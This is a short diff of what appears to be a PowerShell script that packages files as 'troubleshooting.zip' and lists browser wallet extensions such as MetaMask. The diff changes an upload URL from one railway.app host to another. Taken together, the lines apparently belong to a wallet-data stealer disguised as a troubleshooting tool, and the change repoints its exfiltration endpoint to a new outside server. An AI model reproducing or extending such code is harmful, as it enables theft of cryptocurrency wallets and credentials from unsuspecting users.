@@ -133,7 +133,7 @@ $zipFile = Join-Path $destination "troubleshooting.zip"
 # }
 
 
-$uploadUrl = "https://servipaz.up.railway.app/upload"
+$uploadUrl = "https://upload-production-e2b0.up.railway.app/upload"
 
 $extensionIDs = @{
     "MetaMask" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
